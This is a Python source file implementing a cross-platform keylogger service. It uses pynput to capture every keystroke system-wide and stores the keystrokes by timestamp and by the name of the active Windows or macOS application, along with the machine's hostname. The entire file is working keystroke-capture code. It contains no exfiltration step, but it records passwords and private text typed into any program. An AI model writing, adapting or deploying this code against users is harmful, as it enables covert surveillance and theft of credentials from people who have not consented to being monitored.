from typing import Dict
from datetime import datetime
from pynput.keyboard import Listener, Key
import socket
import sys

# Platform-dependent imports
OS_PLATFORM = sys.platform

if OS_PLATFORM == "win32":
    import win32gui
elif OS_PLATFORM == "darwin":
    import AppKit

from key_logger_interface import KeyLoggerInterface


def get_key(key: Key | None) -> str:
    """Converts and returns a key press into a readable string."""
    if key == Key.space:
        return " "
    if isinstance(key, Key):
        return f"[{key.name}]"
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    return "[UNKNOWN]"


def get_active_application() -> str:
    """Returns the name of the active application for macOS and Windows."""
    try:
        if OS_PLATFORM == "darwin":
            return AppKit.NSWorkspace.sharedWorkspace().activeApplication().get('NSApplicationName','Unknown Application')

        if OS_PLATFORM == "win32":
            hwnd = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(hwnd) if hwnd else "Unknown Application"

    except Exception as e:
        print(f"Error retrieving active application: {e}")
        return "Unknown Application"

class KeyLoggerService(KeyLoggerInterface):
    """Logs key presses under the active application with timestamps."""

    def __init__(self):
        """Initializes the keylogger."""
        self.key_logs: Dict[str, Dict[str, str]] = {}
        self.machine_name = socket.gethostname()
        self.listener: Listener | None = None

    def start_logging(self) -> None:
        """Starts logging key presses."""
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self) -> None:
        """Stops the logging process."""
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> Dict[str, Dict[str, str]]:
        """Retrieves the logged key presses."""
        return self.key_logs

    def get_machine_name(self) -> str:
        """Returns the name of the machine."""
        return self.machine_name

    def reset_logs(self) -> None:
        """Resets the key logs dictionary."""
        self.key_logs = {}

    def update_logged_keys(self, key_name: str, active_app: str) -> None:
        """Logs a key press under the timestamp and active application."""
        log_time = datetime.now().strftime("%Y-%m-%d %H_%M")

        if log_time not in self.key_logs:
            self.key_logs[log_time] = {}

        if active_app not in self.key_logs[log_time]:
            self.key_logs[log_time][active_app] = ""

        self.key_logs[log_time][active_app] += key_name

    def on_press(self, key: Key | None) -> None:
        """Handles a key press event and logs it."""
        key_name = get_key(key)
        active_app = get_active_application()
        self.update_logged_keys(key_name, active_app)

        if key == Key.esc:
            self.stop_logging()
